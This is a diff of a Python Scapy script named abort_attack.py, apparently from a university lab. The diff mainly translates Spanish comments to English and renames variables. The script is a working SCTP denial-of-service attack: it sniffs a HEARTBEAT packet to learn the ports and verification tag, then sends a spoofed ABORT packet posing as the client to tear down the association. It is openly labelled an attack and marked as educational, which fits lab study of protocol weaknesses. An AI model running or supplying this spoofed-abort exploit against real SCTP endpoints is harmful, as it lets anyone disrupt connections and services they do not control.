@@ -1,16 +1,29 @@
+"""
+===============================================================================
+Script Name: abort_attack.py
+Description : This script captures a HEARTBEAT SCTP packet to extract relevant information
+              and sends an ABORT SCTP packet to execute an SCTP attack.
+Author      : Grupo de Ingeniería Telemática. Universidad de Cantabria
+===============================================================================
+
+Notes:
+- It uses Scapy library to sniff packets, extract relevant details, crafting a new packet, and send it.
+- The script is designed to run in a controlled environment where SCTP traffic is present.
+- Ensure you have Scapy installed and run this script with appropriate permissions.
+- This script is for educational purposes only. Use responsibly and ethically.
+===============================================================================
+"""
+
 from scapy.all import *
 
-# Constantes para las direcciones IP
-IP_SRC = "10.10.10.7"  # Node Client
-IP_DST = "10.10.10.155"  # Node Server
+IP_CLIENT = "10.10.10.7" # Replace with the actual SCTP client IP
+IP_SERVER = "10.10.10.155" # Replace with the actual SCTP server IP
 
-# Función para verificar HEARTBEAT
 """
-La función isinstance() de Python tiene problemas con el sistema de
-clases dinamicas de Scapy, por lo que lo más robusto es
-inspeccionar el campo 'type' del chunk SCTP directamente.
+Function to check HEARTBEAT
+The Python isinstance() function has problems with Scapy's dynamic class system, 
+so the most robust is to inspect the 'type' field of the SCTP chunk directly.
 """
-
 def is_heartbeat_packet(pkt: Packet) -> bool:
     if SCTP not in pkt:
         print("No SCTP layer")
@@ -32,17 +45,17 @@ def is_heartbeat_packet(pkt: Packet) -> bool:
 
 def main():
 
-    print(f"[*] Monitoring network for SCTP HEARTBEAT packet from {IP_SRC} to {IP_DST}...")
+    print(f"[*] Monitoring network for SCTP HEARTBEAT packet from {IP_CLIENT} to {IP_SERVER}...")
     packets = sniff(
-        filter=f"sctp and src host {IP_SRC} and dst host {IP_DST}",
+        filter=f"sctp and src host {IP_CLIENT} and dst host {IP_SERVER}",
         lfilter=is_heartbeat_packet,
         count=1
     )
 
-    # Extraer el paquete de la lista PacketList
+    # Extract the packet from the PacketList
     heartbeat_pkt = packets[0]
 
-    # Extraer y mostrar datos relevantes
+    # Extract and display relevant data
     src_ip = heartbeat_pkt[IP].src
     dst_ip = heartbeat_pkt[IP].dst
     src_port = heartbeat_pkt[SCTP].sport
@@ -56,25 +69,24 @@ def main():
     print(f"   - Destination Port: {dst_port}")
     print(f"   - Verification Tag: {vtag:#010x}")
 
-    # Construir el paquete ABORT con "Don't Fragment"
+    # Build the ABORT package with “Don't Fragment”.
     abort_pkt = (
-        IP(src=IP_SRC, dst=IP_DST, id=0x0000, flags="DF") /
+        IP(src=IP_CLIENT, dst=IP_SERVER, id=0x0000, flags="DF") /
         SCTP(sport=src_port, dport=dst_port, tag=vtag) /
         SCTPChunkAbort()
     )
 
     print("\n[*] ABORT packet parameters:")
-    print(f"   - Source IP: {IP_SRC} (spoofed as Node Client)")
-    print(f"   - Destination IP: {IP_DST} (Node Server)")
+    print(f"   - Source IP: {IP_CLIENT} (spoofed as Node Client)")
+    print(f"   - Destination IP: {IP_SERVER} (Node Server)")
     print(f"   - Source Port: {src_port}")
     print(f"   - Destination Port: {dst_port}")
     print(f"   - Verification Tag: {vtag:#010x}")
 
-    # Enviar el paquete ABORT
-    print(f"\n[*] Sending ABORT packet to Node Server ({IP_DST})...")
+    # Send the ABORT packet
+    print(f"\n[*] Sending ABORT packet to Node Server ({IP_SERVER})...")
     send(abort_pkt, verbose=False)
     print("   - ABORT packet sent.")
-
 
 if __name__ == "__main__":
     main()
